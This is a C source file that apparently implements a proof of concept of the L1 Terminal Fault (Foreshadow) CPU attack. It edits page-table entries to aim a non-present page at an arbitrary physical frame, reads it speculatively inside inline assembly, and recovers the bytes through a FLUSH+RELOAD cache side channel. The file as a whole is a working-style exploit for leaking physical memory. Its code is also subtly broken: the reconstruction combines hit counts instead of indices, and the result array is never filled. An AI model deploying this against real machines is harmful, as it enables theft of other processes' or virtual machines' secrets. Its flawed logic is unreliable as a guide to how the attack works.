#include "asm.h"
#include "constants.h"
#include "flush_and_reload.h"
#include "statistics.h"
#include <bits/types/siginfo_t.h>
#include <signal.h>
#include <stdint.h>
#include <stdlib.h>
#include <sys/mman.h>
#include <ucontext.h>
#include <unistd.h>

#pragma GCC diagnostic push
#pragma GCC diagnostic ignored "-Wunused-function"
#include "ptedit_header.h"
#pragma GCC diagnostic pop

#include <assert.h>

extern uint64_t reload_label(void);

#define REG_RIP 16
#pragma GCC diagnostic push
#pragma GCC diagnostic ignored "-Wunused-parameter"
static void segfault_handler(int sig, siginfo_t *info, void *ucontext) {
  ucontext_t *uc = (ucontext_t *)ucontext;
  greg_t *rip = &uc->uc_mcontext.gregs[REG_RIP];
  *rip = (uint64_t)&reload_label;
}
#pragma GCC diagnostic pop

// The reload buffer will be used to leak 8 bytes at a time.
// Instead of leaking byte-for-byte, and thus needing a covert
// channel "resolution" of 2^8 = 256 pages per byte we want to leak,
// we can leak nibble-for-nibble. This requires just 2^4 = 16 pages
// per nibble, giving us the ability to leak 256/16 = 16 nibbles = 8 bytes
// per FLUSH+RELOAD iteration.
// The tradeoff is that we require a larger speculative window, and need
// some additional post processing to reconstruct the data.
#define RELOAD_BUFFER_AMOUNT_OF_PAGES 16 * 2
#define RELOAD_BUFFER_SIZE RELOAD_BUFFER_AMOUNT_OF_PAGES *PAGE_SIZE

uint8_t l1tf(void *leak_addr, void *reload_buffer, size_t threshold) {
  size_t raw_results[RELOAD_BUFFER_AMOUNT_OF_PAGES] = {0};

  flush(RELOAD_BUFFER_AMOUNT_OF_PAGES, PAGE_SIZE, reload_buffer);

  // Flush the address of the segfault handler to increase
  // the length of the speculative window (hopefully?)
  clflush((void *)segfault_handler);
  mfence();

  asm volatile("xor %%rax, %%rax\n"
               "xor %%rbx, %%rbx\n"
               "movq $0x10000, %%rcx\n"
               "movb (%[leak_addr]), %%al\n"
               "movb %%al, %%bl\n"
               "and $0xf0, %%al\n"
               "and $0x0f, %%bl\n"
               "shl $0xc, %%ebx\n"
               "shl $0x8, %%eax\n"
               "prefetcht0 (%[reload_buffer], %%rbx)\n"
               "add %%rcx, %[reload_buffer]\n"
               "prefetcht0 (%[reload_buffer], %%rax)\n"
               "mfence\n"
               "loop:\n"
               "pause\n"
               "jmp loop\n"
               ".global reload_label\n"
               "reload_label:"

               ::[leak_addr] "r"(leak_addr),
               [reload_buffer] "r"(reload_buffer)
               : "rax", "rbx", "rcx");

  reload(RELOAD_BUFFER_AMOUNT_OF_PAGES, PAGE_SIZE, reload_buffer, raw_results,
         threshold);

  // Reconstruct
  uint8_t result = 0;
  for (size_t nibble = 0; nibble < RELOAD_BUFFER_AMOUNT_OF_PAGES / 16;
       ++nibble) {
    size_t *partial_results = &raw_results[nibble * 16];
    size_t max_idx = maximum(16, partial_results);
    size_t max = partial_results[max_idx];
    result |= max << (4 * nibble);
  }

  return result;
}

int main(int argc, char *argv[argc]) {
  // Step 1: Create a variable
  // Step 2: modify PTE to change make page containing that variable non-present
  //         and modify the PFN
  // Step 3: FLUSH reload buffer
  // Step 4: Speculatively access variable
  // Step 5: RELOAD reload buffer
  assert(argc > 0);
  if (argc != 3) {
    fprintf(stderr, "Usage: %s [physical address to leak in hex] [length]\n",
            argv[0]);
    exit(1);
  }

  char *tail = NULL;
  uintptr_t phys_addr = strtoull(argv[1], &tail, 16);
  assert(tail != argv[1]);
  size_t pfn = (phys_addr & ~(0xfff)) >> 0xc;

  tail = NULL;
  size_t length = strtoull(argv[2], &tail, 10);
  assert(tail != argv[2]);
  assert((phys_addr & 0xfff) + length < PAGE_SIZE);

  fprintf(stderr, "Attempting to leak %ld bytes from %p\n", length,
          (void *)phys_addr);

  void *leak = mmap(NULL, PAGE_SIZE, PROT_WRITE | PROT_READ,
                    MAP_PRIVATE | MAP_ANONYMOUS | MAP_POPULATE, -1, 0);

  void *reload_buffer = mmap(NULL, RELOAD_BUFFER_SIZE, PROT_WRITE | PROT_READ,
                             MAP_PRIVATE | MAP_ANONYMOUS | MAP_POPULATE, -1, 0);
  assert(reload_buffer != MAP_FAILED);

  size_t threshold = 150;

  // Modify the PFN
  assert(!ptedit_init());
  assert(!mprotect(leak, PAGE_SIZE, PROT_NONE));
  size_t leak_original_pfn = ptedit_pte_get_pfn(leak, 0);
  ptedit_pte_clear_bit(leak, 0, PTEDIT_PAGE_BIT_PRESENT);
  ptedit_pte_set_pfn(leak, 0, pfn);

  struct sigaction sa = {0};
  sa.sa_handler = (void *)segfault_handler;
  sigaction(SIGSEGV, &sa, NULL);

  memset(reload_buffer, 0, RELOAD_BUFFER_SIZE);

  size_t start = (phys_addr & 0xfff);
  for (size_t j = start; j < start + length; j += 1) {
    size_t results[VALUES_IN_BYTE] = {0};
    void *leak_addr = (char *)leak + j;

    // printf("pfn after set %lx\n", ptedit_pte_get_pfn(leak, 0));

    for (int i = 0; i < 10; ++i) {
      l1tf(leak_addr, reload_buffer, threshold);
    }

    for (size_t i = 0; i < VALUES_IN_BYTE; ++i) {
      if (results[i] > 0) {
        printf("Results physcial addr %lx:\t", (pfn << 12) | j);
        printf("0x%lx\t%ld\n", i, results[i]);
      }
    }
  }
  // Restore the segfault handler back to normal
  sa.sa_handler = SIG_DFL;
  sigaction(SIGSEGV, &sa, NULL);

  // Restore leak PFN before munmapping the buffer
  ptedit_pte_set_pfn(leak, 0, leak_original_pfn);
  assert(!munmap(leak, PAGE_SIZE));
  assert(!munmap(reload_buffer, VALUES_IN_BYTE * PAGE_SIZE));
  ptedit_cleanup();
}
